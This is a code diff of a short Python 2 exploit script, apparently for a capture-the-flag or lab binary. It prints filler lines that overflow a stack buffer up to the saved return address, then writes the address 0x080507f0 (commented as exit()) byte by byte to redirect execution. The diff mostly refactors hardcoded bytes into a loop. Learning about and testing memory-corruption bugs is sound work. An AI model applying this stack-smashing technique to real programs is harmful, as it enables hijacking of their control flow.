@@ -1,18 +1,27 @@
 #! /usr/bin/python2
 
-print("__________")
+print("__________")  # To be read into `plaintext`
 
+payload = (
+    0x080507f0,  # exit()
+)
+
+# Note i is currently being overwritten by the newline character!
 #            &i   - &buffer
 len_buffer = 0x28 - 0x1c
 
+# Fill stack until the return address
 for i in range(24):
-	print("A" + "B" * (len_buffer - 1))
+    print("\x00" + "B" * (len_buffer - 1))
 
-# Python 3 for some reason changes \xf0 to \x??c3 something with encoding???
-# 0x080507f0
-print("\xf0" + "B" * (len_buffer - 1))
-print("\x07" + "B" * (len_buffer - 1))
-print("\x05" + "B" * (len_buffer - 1))
-print("\x08" + "B" * (len_buffer - 1) + chr(9) + chr(0) + chr(0) + chr(0))  
+# Write our required return address and data to the stack
+byte_mask = (0b1 << 8) - 1
+for word in payload:
+    assert (word >> 32) == 0  # 4 byte address
+    for i in range(4):
+        byte = word & byte_mask
+        print(chr(byte) + "B" * (len_buffer - 1))
+        word >>= 8
 
-
+# Finish writing data with a dummy byte
+print("\x00" + "B" * (len_buffer - 1) + chr(9) + chr(0) + chr(0) + chr(0))
